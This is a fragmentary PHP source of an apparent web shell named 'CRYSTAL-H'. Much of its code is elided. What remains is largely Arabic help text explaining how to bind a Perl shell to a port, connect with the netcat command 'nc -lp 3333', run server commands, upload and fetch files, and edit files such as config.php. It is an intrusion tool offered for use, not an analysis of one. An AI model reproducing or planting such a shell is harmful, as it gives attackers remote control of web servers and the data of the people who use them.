...
<?php
if ('help' == $act) {
    echo '<center><b>السلام عليكم ورحمة الله وبركاته<br><br>عزيزي المستخدم<br>اذا اردت المساعدة اضغط على اسم الخيار الموضح باللون الازرق<br>وستظهر لك معلومات الخيار   </a>.</b>';
}
if ('bindport' == $act) {
...
if ('bind' == $act) {
    echo '<center><b>CRYSTAL-H:<br><br>-Connect قم بالضغط على خيار.<br>.- بعد مايتم انزال السكريبت بالمجلد<br>.-توجه لاداة النت كات وتصنت على<br>nc -lp 3333بكتابة المنفذ - <br>السكريبت بلغة البيرل <br>Bind port to  :<br> bind shell وهنيئا ً لك   </a>.</b>';
}

if ('command' == $act) {
    echo '<center><b>CRYSTAL-H:<br><br>لأختيار الاوامر الجاهزه  Select ------ x  اضغط على الخيار<br>.- واذا اردت كتابه  الاوامر بنفسك قد تكتفي بالخيار<br>Command   </a>.</b>';
}
...
if (isset($_POST['post']) and 'yes' == $_POST['post'] and '' !== @$HTTP_POST_FILES['userfile'][name]) {
...
if ((isset($_POST['fileto'])) || (isset($_POST['filefrom']))) {
    ...
    if ($ok) {
        ...
        echo '<center><div id=logostrip>Download - OK. (' . $sizef . '??)</div></center>';
    } else {
        echo '<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>';
    }
}

if (isset($_POST['installbind'])) {
    if (true == is_dir($_POST['installpath'])) {
...
<a bookmark="minipanel">
	...
	&nbsp;<?php
if ('edit' == $act) {
    echo '<center><b>التحرير والانشاء:<br><br> قم بوضع اسم الملف الذي تريد تحريره فقط<br>وبعد ذالك الضغط على config.php مثال<br>Edit<br>ستظهر لك نافذه بها محتويات الملف <br>وايضا ً اذا اردت انشاء ملف فقط ضع اسمه مع الامتداد <br>وبعد ذالك اكتب ماتريد washer-crystal.txt   </a>.</b>';
}
?>
	</p>
	<p>&nbsp;</p>
...
?>
 ...
 <td width="50%" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
                 <?php
if ('upload' == $act) {
    echo '<center><b>رفع الملفات:<br><br>قم بتحديد الملف المراد رفعه <br>وبعد ذالك قم بالضغط على الخيار الموضح<br>UPLOAD< </a>.</b>';
}
